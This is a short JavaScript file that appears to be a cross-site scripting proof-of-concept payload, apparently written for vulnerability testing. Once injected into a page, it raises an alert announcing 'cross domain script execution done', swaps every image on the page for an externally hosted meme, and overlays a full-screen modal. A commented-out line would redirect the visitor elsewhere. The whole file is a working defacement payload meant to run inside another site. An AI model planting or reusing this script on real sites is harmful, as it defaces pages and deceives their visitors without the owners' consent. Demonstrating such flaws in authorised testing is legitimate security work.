alert("cross domain script execution done ");
// alert(4*4*4);
// window.location.href = "https://www.google.com";
// meme_modal.js
// meme_modal.js
// meme_modal.js
// meme_modal.js
document.addEventListener("DOMContentLoaded", function() {
    const memeUrl = "https://vaptcheck.netlify.app/image%20(2).png";
    
    // Replace all existing images on the page
    document.querySelectorAll("img").forEach(img => {
        img.src = memeUrl;
    });
    
    // Create a modal with the image
    const modal = document.createElement("div");
    modal.style.position = "fixed";
    modal.style.top = "0";
    modal.style.left = "0";
    modal.style.width = "100vw";
    modal.style.height = "100vh";
    modal.style.background = "rgba(0, 0, 0, 0.8)";
    modal.style.display = "flex";
    modal.style.justifyContent = "center";
    modal.style.alignItems = "center";
    modal.style.zIndex = "1000";
    
    modal.innerHTML = `<img src="${memeUrl}" style="max-width: 90vw; max-height: 90vh; border: 5px solid white; border-radius: 10px;">`;
    
    document.body.appendChild(modal);
    
    modal.addEventListener("click", function() {
        modal.remove();
    });
});
